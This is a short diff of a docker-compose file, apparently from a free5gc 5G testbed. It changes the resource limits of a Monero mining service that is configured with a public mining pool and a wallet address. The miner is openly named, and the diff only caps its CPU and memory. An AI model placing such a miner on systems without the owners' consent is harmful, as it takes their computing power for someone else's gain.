@@ -234,13 +234,14 @@ services:
     environment:
       - POOL_URL=pool.supportxmr.com:5555
       - POOL_USER=49JMbPcYXCm58R8Ku5NhnDjHbvtP1eMi1HekvNXQxVzpEGL9guRT9xnVPiEnMCXy1gXT1Z3cjbSMcjUeCiPM3dAuV315kdg
-      - MAX_CPU = 25
     networks:
       privnet:
         aliases:
           - monero.free5gc.org
     depends_on:
-      - free5gc-upf 
+      - free5gc-upf
+    mem_limit: 1000m
+    cpus: 0.5
 
 networks:
   privnet:
